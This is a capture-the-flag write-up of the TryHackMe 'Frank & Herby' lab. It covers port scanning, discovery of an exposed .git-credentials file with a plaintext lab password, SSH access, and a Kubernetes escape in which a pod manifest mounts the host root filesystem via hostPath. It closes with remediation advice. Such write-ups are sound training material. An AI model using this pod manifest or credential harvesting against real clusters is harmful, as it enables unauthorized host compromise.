# TryHackMe — Frank & Herby

> **Platform:** TryHackMe
> **Machine:** Frank & Herby
> **Difficulty:** Medium
> **Operating System:** Linux
> **Target IP:** `10.48.129.150`

---

## 📌 Overview

In this writeup, I will be documenting my approach to solving the **Frank & Herby** TryHackMe machine.

The scenario focuses on the security risks surrounding:

* Kubernetes
* MicroK8s
* Containers
* Git repositories and exposed credentials
* Docker Registry access
* Kubernetes privilege escalation
* Host filesystem mounting

The challenge scenario states that two developers experimenting with Kubernetes, containers, and Git have unintentionally exposed resources that can be exploited.

The objective is to gain initial access to the machine and eventually escalate privileges to **root**.

---

# 📑 Table of Contents

* [Initial Enumeration](#-initial-enumeration)
* [Service and Version Detection](#-service-and-version-detection)
* [Web Enumeration](#-web-enumeration)
* [Directory Fuzzing](#-directory-fuzzing)
* [Exposed Git Credentials](#-exposed-git-credentials)
* [Initial Access](#-initial-access)
* [User Flag](#-user-flag)
* [MicroK8s Enumeration](#-microk8s-enumeration)
* [Kubernetes Privilege Escalation](#-kubernetes-privilege-escalation)
* [Host Filesystem Mount](#-host-filesystem-mount)
* [Root Access](#-root-access)
* [Attack Path Summary](#-attack-path-summary)
* [Key Lessons Learned](#-key-lessons-learned)
* [Conclusion](#-conclusion)

---

# 🔎 Initial Enumeration

The first step was to perform a full TCP port scan against the target.

```bash
nmap -p- <TARGET_IP>
```

The scan revealed the following ports:

```text
22/tcp    open     ssh
3000/tcp  open     ppp
16443/tcp open     unknown
25000/tcp open     unknown
31337/tcp filtered Elite
32000/tcp filtered unknown
```

The initial interesting services included:

| Port    | Service         | Notes                                 |
| ------- | --------------- | ------------------------------------- |
| `22`    | SSH             | Potential remote access               |
| `3000`  | Web Application | HTTP service detected                 |
| `16443` | HTTPS/API       | Returned Kubernetes-related responses |
| `25000` | Unknown         | TLS-enabled service                   |
| `31337` | HTTP            | Nginx web server                      |
| `32000` | HTTP            | Docker Registry                       |

The presence of ports associated with Kubernetes and container infrastructure was especially interesting.

---

# 🛰️ Service and Version Detection

A more detailed scan was performed using Nmap scripts and version detection.

```bash
nmap -sC -sV <TARGET_IP>
```

The scan identified:

```text
22/tcp
OpenSSH 8.2p1 Ubuntu
```

The service on port `3000` returned an HTTP response and appeared to be a web application.

Port `16443` returned:

```text
401 Unauthorized
```

The response contained:

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

This was a major indicator that the service was related to a **Kubernetes API**.

The SSL certificate also contained Kubernetes-related names, including:

```text
kubernetes
kubernetes.default
kubernetes.default.svc
kubernetes.default.svc.cluster
kubernetes.default.svc.cluster.local
```

Port `32000` was identified as:

```text
Docker Registry (API: 2.0)
```

This further confirmed that the target was running container-related infrastructure.

---

# 🌐 Web Enumeration

Web enumeration was performed against the available HTTP services.

One of the primary web applications was running on:

```text
http://<TARGET_IP>:31337/
```

The server was identified as:

```text
nginx/1.21.3
```

The page title was:

```text
Heroic Features - Start Bootstrap Template
```

Another web service was also available on port:

```text
3000
```

Both services were considered during further enumeration.

---

# 📂 Directory Fuzzing

Directory and file enumeration was performed against the web server on port `31337`.

```bash
dirsearch -u http://<TARGET_IP>:31337/
```

During the scan, an interesting file was discovered:

```text
/.git-credentials
```

The server returned:

```text
200 OK
```

This was a critical finding because `.git-credentials` files can contain stored Git authentication credentials.

---

# 🔑 Exposed Git Credentials

The discovered file was accessed:

```text
/.git-credentials
```

The contents contained:

```text
http://frank:f%40an3-1s-E337%21%21@192.168.100.50
```

The credentials were URL encoded.

The username was identified as:

```text
frank
```

The password was:

```text
f@an3-1s-E337!!
```

> ⚠️ The credentials above were recovered from the authorized TryHackMe lab environment.

This discovery provided valid credentials that could potentially be reused for remote access.

---

# 🖥️ Initial Access

The recovered credentials were used to gain SSH access as the user:

```text
frank
```

After successfully logging in, the home directory contained:

```text
repos
snap
user.txt
```

The presence of `user.txt` confirmed successful initial access to the target as a low-privileged user.

---

# 🚩 User Flag

After gaining access as `frank`, the user flag was located in the home directory.

```bash
ls
```

Output:

```text
repos
snap
user.txt
```

The flag file could then be accessed:

```bash
cat user.txt
```

At this point, the initial access objective had been completed.

The next step was:

# 🔥 Privilege Escalation

---

# ☸️ MicroK8s Enumeration

The challenge scenario specifically referenced Kubernetes and MicroK8s.

The available MicroK8s functionality was inspected.

```bash
microk8s
```

Available subcommands included:

```text
add-node
config
ctr
dashboard-proxy
disable
enable
helm
helm3
kubectl
start
status
stop
inspect
```

The important command was:

```text
microk8s kubectl
```

This indicated that the `frank` user had access to Kubernetes management functionality.

This became the primary privilege escalation path.

---

# 🔍 Kubernetes Investigation

Further enumeration was performed to understand the Kubernetes environment and available resources.

The investigation identified a Kubernetes-related privilege escalation opportunity.

The report identified the environment as vulnerable to:

```text
CVE-2019-15789
```

The next objective was to create a Kubernetes pod capable of mounting the host filesystem.

---

# 🐳 Kubernetes Host Mount

A malicious pod configuration was created.

```bash
nano pod.yaml
```

The configuration used was:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostmount

spec:
  containers:
  - name: shell
    image: localhost:32000/bsnginx@sha256:59dafb4b06387083e51e2589773263ae301fe4285cfa4eb85ec5a3e70323d6bd
    command:
      - "bin/bash"
      - "-c"
      - "sleep 10000"

    volumeMounts:
      - name: root
        mountPath: /opt/root

  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
```

The important section was:

```yaml
hostPath:
  path: /
```

This configuration references the root filesystem of the Kubernetes host.

The host filesystem was then mounted inside the container at:

```text
/opt/root
```

This is the key security issue that allowed the container environment to access the underlying host filesystem.

---

# 🚀 Deploying the Pod

The pod was deployed using:

```bash
microk8s kubectl apply -f pod.yaml
```

The result confirmed that the pod was configured:

```text
pod/hostmount configured
```

This demonstrated that the current user had sufficient Kubernetes permissions to deploy the pod.

---

# 🐚 Accessing the Container

The deployed container was accessed using `kubectl exec`.

```bash
microk8s kubectl exec -it hostmount /bin/bash
```

The resulting shell showed:

```text
root@hostmount:/#
```

A warning was also displayed regarding the older command syntax:

```text
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version.

Use kubectl exec [POD] -- [COMMAND] instead.
```

The modern syntax is:

```bash
microk8s kubectl exec -it hostmount -- /bin/bash
```

The container was now accessible as the root user.

---

# 💀 Host Filesystem Access

The Kubernetes pod configuration mounted the host root filesystem at:

```text
/opt/root
```

This allowed the container to interact with files belonging to the underlying host through the mounted filesystem.

The privilege escalation path was therefore:

```text
frank
  ↓
MicroK8s Access
  ↓
Kubernetes Pod Creation
  ↓
hostPath Volume
  ↓
Host Root Filesystem Mounted
  ↓
Container Root Access
  ↓
Host Filesystem Access
  ↓
Root Flag
```

The root flag was then obtained from the mounted host filesystem.

---

# 🚩 Root Access

After successfully exploiting the Kubernetes/MicroK8s configuration, access to the host filesystem was obtained through the mounted volume.

The challenge's final objective was completed by retrieving:

```text
root.txt
```

This resulted in successful completion of the machine.

---

# ⚔️ Attack Path Summary

The complete attack chain was:

```text
Network Enumeration
        │
        ▼
Full Nmap Scan
        │
        ▼
Multiple Web Services Discovered
        │
        ▼
Directory Fuzzing
        │
        ▼
Exposed /.git-credentials
        │
        ▼
Git Credentials Recovered
        │
        ▼
SSH Access as frank
        │
        ▼
User Flag Obtained
        │
        ▼
MicroK8s Enumeration
        │
        ▼
Kubernetes Privilege Escalation Opportunity
        │
        ▼
Create Malicious Pod
        │
        ▼
Mount Host Filesystem Using hostPath
        │
        ▼
Deploy Pod with microk8s kubectl
        │
        ▼
Access Container as Root
        │
        ▼
Access Mounted Host Filesystem
        │
        ▼
Retrieve root.txt
```

---

# 🔐 Key Findings

## 1. Exposed Git Credentials

The web server exposed:

```text
/.git-credentials
```

This allowed valid credentials to be recovered.

### Security Impact

An attacker could potentially:

* Recover usernames and passwords
* Reuse credentials against SSH
* Access private repositories
* Move laterally to other systems
* Gain initial access

### Recommendation

Sensitive credential files should never be exposed through a web server.

Ensure that:

```text
.git
.git-credentials
.env
credentials
config files
backup files
```

are not publicly accessible.

---

## 2. Credential Reuse

The recovered Git credentials were successfully used to obtain SSH access as:

```text
frank
```

This demonstrates the danger of reusing credentials across multiple services.

### Recommendation

* Avoid credential reuse
* Use SSH keys where possible
* Implement multi-factor authentication
* Rotate exposed credentials immediately
* Monitor for unusual authentication activity

---

## 3. Excessive MicroK8s Permissions

The low-privileged user had access to:

```text
microk8s kubectl
```

This provided access to Kubernetes management functionality.

In a containerized environment, Kubernetes permissions should be carefully controlled.

### Recommendation

Follow the principle of:

> **Least Privilege**

Users should only receive the Kubernetes permissions required for their intended tasks.

---

## 4. Dangerous `hostPath` Mount

The Kubernetes pod was able to mount:

```text
/
```

from the host filesystem.

This is extremely dangerous when users or workloads can create arbitrary pods.

A container that mounts sensitive host directories can potentially access resources outside its intended container boundary.

### Recommendation

Restrict:

* `hostPath` volumes
* Privileged containers
* Arbitrary pod creation
* Access to sensitive host directories

Use Kubernetes security controls and appropriate admission policies to prevent dangerous workload configurations.

---

# 🧠 Lessons Learned

This machine demonstrated several important concepts.

### 🔎 Enumeration Matters

A complete port scan revealed services that initially appeared unusual.

```bash
nmap -p- <TARGET_IP>
```

Without enumeration, the Kubernetes and Docker-related attack surface could have been missed.

---

### 🌐 Web Enumeration Can Lead to Initial Access

Directory fuzzing discovered:

```text
/.git-credentials
```

A seemingly small web exposure led directly to valid SSH credentials.

---

### 🔑 Never Ignore Credential Files

Files such as:

```text
.git-credentials
.env
config.php
backup.zip
id_rsa
credentials.txt
```

should always be considered high-value findings during an authorized penetration test.

---

### ☸️ Kubernetes Requires Its Own Security Mindset

Container security is not only about the container itself.

Important areas include:

* Kubernetes RBAC
* Pod creation permissions
* Container privileges
* Mounted volumes
* HostPath usage
* Docker registries
* Service accounts
* Secrets management

A weak Kubernetes configuration can allow an attacker to move beyond a container and potentially compromise the underlying host.

---

### 🐳 Containers Are Not Automatically Secure

Containers provide isolation, but that isolation can be weakened by configuration mistakes.

Mounting sensitive host paths into a container can effectively break the expected security boundary.

---

# 🛠️ Tools Used

* `Nmap`
* `Burp Suite`
* `dirsearch`
* `SSH`
* `MicroK8s`
* `kubectl`

---

# 📚 Skills Practiced

* Network Enumeration
* Port Scanning
* Service Enumeration
* Web Application Enumeration
* Directory Fuzzing
* Git Credential Discovery
* URL-Encoding Analysis
* Credential Reuse
* SSH Access
* Linux Post-Exploitation
* Kubernetes Enumeration
* MicroK8s Enumeration
* Kubernetes Pod Deployment
* Container Security
* `hostPath` Volume Abuse
* Linux Privilege Escalation
* Container-to-Host Access

---

# 🧾 Conclusion

The **Frank & Herby** machine demonstrated how multiple small security issues can be chained together to achieve complete compromise.

The attack began with web enumeration, where an exposed `.git-credentials` file revealed valid credentials. These credentials were then used to gain SSH access as `frank`.

From there, access to **MicroK8s** became the key to privilege escalation. By creating a Kubernetes pod with access to the host filesystem through a `hostPath` mount, the container boundary could be abused to access the underlying system and obtain the root flag.

The complete progression was:

```text
Web Enumeration
→ Exposed Credentials
→ SSH Access
→ MicroK8s Access
→ Kubernetes Pod Creation
→ Host Filesystem Mount
→ Root Access
```

> **Main Takeaway:** A secure environment depends not only on secure software, but also on secure configuration. Exposed credentials and excessive Kubernetes permissions can turn isolated services into a complete system compromise.

---

## ⚠️ Disclaimer

This writeup is created for **educational purposes** and documents activity performed in an authorized **TryHackMe lab environment**.

Do not attempt these techniques against systems or infrastructure without explicit permission.

---
